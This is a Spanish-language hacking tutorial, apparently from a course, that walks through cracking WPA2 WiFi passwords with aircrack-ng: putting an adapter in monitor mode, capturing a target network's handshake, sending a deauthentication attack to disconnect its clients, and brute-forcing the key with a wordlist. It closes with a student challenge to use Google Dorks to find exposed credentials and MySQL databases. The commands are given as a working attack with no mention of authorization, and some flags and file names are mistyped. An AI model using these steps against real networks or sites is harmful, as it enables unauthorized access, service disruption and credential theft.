En los últimos años, las redes WiFi han recorrido un largo camino y siempre que su red esté usando el cifrado WPA2-AES, una contraseña fuerte, y tiene el WPS deshabilitado será extrremadamente difícil de acceder. Hey! vamos a intentarlo.

Un método para hackear las contraseñas cifradas de Wi-Fi es mediante la fuerza bruta, por lo que cada combinación de caracteres se intenta hasta que llegue a la correcta. Es teóricamente posible, pero esto puede tomar años en la práctica, especialmente si se utiliza una contraseña larga.

## Pasos para descifrar contraseñas Wi-Fi con Aircrack-Ng

#### Preparando el Adaptador:

Compruebe que Kali puede detectar el adaptador abriendo la terminal y ejecutando el comando: **airmon-ng**

Deshabilitar cualquier proceso que pueda interferir con su captura de paquetes, escriba el siguiente comando: **airmon-ng check kill**

Ahora poner el adaptador en modo de monitoreo con el comando: **airmon-ng start wlan0**

Anotar el nombre de la interfaz y ejecute airodump-ng (nombre de la interfaz) para listar las redes que le rodean, por ejemplo:

//Ejecute el siguiente comando

//para empezar a escuchar todas las conexiones WiFi disponibles

**airodump-ng wlan0mon**

#### Encontrando la Red WiFi Objetivo:

Encuentre la lista, la red que tiene como objetivo descifrar su contraseña. Anote el “BBSID” y “CH” (canal).

A continuación, después de haber visto su objetivo presione las teclas Ctrl+C y ejecute el comando:

**airodump-ng -c 6 —bssid 02:08:22:7E:B7:6F —write EsGeeks wlan0mon**

-   **-C:** Es un número del canal de la red que aparece en la columna CH (En la salida de la pantalla anterior). En mi caso es 6.
    
-   **-bssid:** Es la dirección MAC de la red objetivo. En mi caso es EsGeeks y el BSSID es 02:08:22:7E:B7:6F
    
-   **-write:** Es el archivo de captura en la que se guardarán los paquetes. En mi caso la he nombrado como “EsGeeks”.
    
-   **-w:** Es el prefijo del nombre de archivo que contendrá el handshake.
    
-   **wlan0mon:** La interfaz inalámbrica.
    

#### Lanzando un ataque deauth:

Ahora abrimos una nueva terminal e iniciamos el ataque deauth para desconectar todos los cientes conectados a la red. Ésto le ayudará en la captura del handshake. Ingrese el comando:

aireplay-ng-0 10 -a 02:08:22:7E:B7:6F -e XXXX wlan0mon

-   **-0:** Se utiliza para el ataque deauth.
    
-   **10:** Es el número de paquetes deauth para ser enviados.
    
-   **-a:** Es la dirección MAC de la red WiFi objetivo.
    
-   **-e:** Es el ESSID de la red objetivo, es decir, su nombre.
    

**Después de lanzar el ataque deauth y conseguir el HANDSHAKE WPA, pulse Ctrl+C**

#### Descifrando Claves Wi-Fi por fuerza bruta:

Ahora tenemos que romper la clave con aircrack-ng, escriba el comando:

**aircrack-ng xxxx.cap -w rockyou.txt**

-   **EsGeeks-01.cap:** Es el archivo de captura que generamos en el airodump-ng. (puede ejecutar el comando “ls” para mostrar el nombre exacto de su archivo de registro).
    
-   **-w:** Es el diccionario que se utilizará para llevar a cabo el ataque de fuerza bruta.
    

# RETO: Hacking

En el presente reto, se propone al alumno realizar diferentes búsquedas mediante Google Dorks:

-   Búsqueda de documentos excel en algunas webs.
    
-   Búsqueda de credenciales user y password.
    
-   Búsqueda de bases de datos mysql.
    
-   Búsqueda de user y passwords bases de datos mysql.